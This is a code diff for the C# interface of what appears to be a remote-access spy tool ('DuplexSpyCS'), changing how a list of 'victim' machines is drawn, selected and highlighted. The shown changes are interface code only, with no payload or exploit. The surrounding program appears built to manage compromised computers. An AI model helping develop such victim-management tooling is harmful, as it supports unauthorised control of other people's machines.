@@ -1602,10 +1602,10 @@ namespace DuplexSpyCS
             };
             newListView1.DrawItem += (s, e) =>
             {
+                
+
                 if (newListView1.View != View.LargeIcon)
                     return;
-
-                e.DrawBackground();
 
                 string key = ((clsVictim)e.Item.Tag).ID;
                 Image img = _screens[key];
@@ -1673,6 +1673,10 @@ namespace DuplexSpyCS
                         ilRowHack.ImageSize = new Size(size, size);
                     }
                     return;
+                }
+                else
+                {
+
                 }
 
                 TextRenderer.DrawText(
@@ -2231,6 +2235,13 @@ namespace DuplexSpyCS
         //Open folder
         private void toolStripMenuItem18_Click(object sender, EventArgs e)
         {
+            List<ListViewItem> items = newListView1.SelectedItems.Cast<ListViewItem>().ToList();
+            if (items.Count == 0)
+            {
+                MessageBox.Show("Please select at least one online machine.", "Nothing is selected", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }    
+
             foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
@@ -2240,30 +2251,47 @@ namespace DuplexSpyCS
 
         private void toolStripMenuItem19_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in newListView1.SelectedItems)
-            {
-                if (item.BackColor == newListView1.BackColor)
-                    item.BackColor = Color.IndianRed;
-                else
-                    item.BackColor = newListView1.BackColor;
-            }
+            
         }
 
         //Highlight - yes
         private void toolStripMenuItem30_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in newListView1.SelectedItems)
+            List<ListViewItem> items = newListView1.SelectedItems.Cast<ListViewItem>().ToList();
+            if (items.Count == 0)
+            {
+                MessageBox.Show("Please select at least one online machine.", "Nothing is selected!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+            
+            foreach (ListViewItem item in items)
             {
                 item.BackColor = Color.IndianRed;
+                foreach (ListViewItem.ListViewSubItem subItem in item.SubItems)
+                {
+                    subItem.BackColor = Color.IndianRed;
+                }
             }
+
+            newListView1.Invalidate();
         }
-        //Highlight - now
+        //Highlight - no
         private void toolStripMenuItem31_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in newListView1.SelectedItems)
+            List<ListViewItem> items = newListView1.SelectedItems.Cast<ListViewItem>().ToList();
+
+
+            foreach (ListViewItem item in items)
             {
                 item.BackColor = newListView1.BackColor;
+                foreach (ListViewItem.ListViewSubItem subItem in item.SubItems)
+                {
+                    subItem.BackColor = newListView1.BackColor;
+                }
             }
+
+            newListView1.Invalidate();
+
         }
 
         //Multi-URL
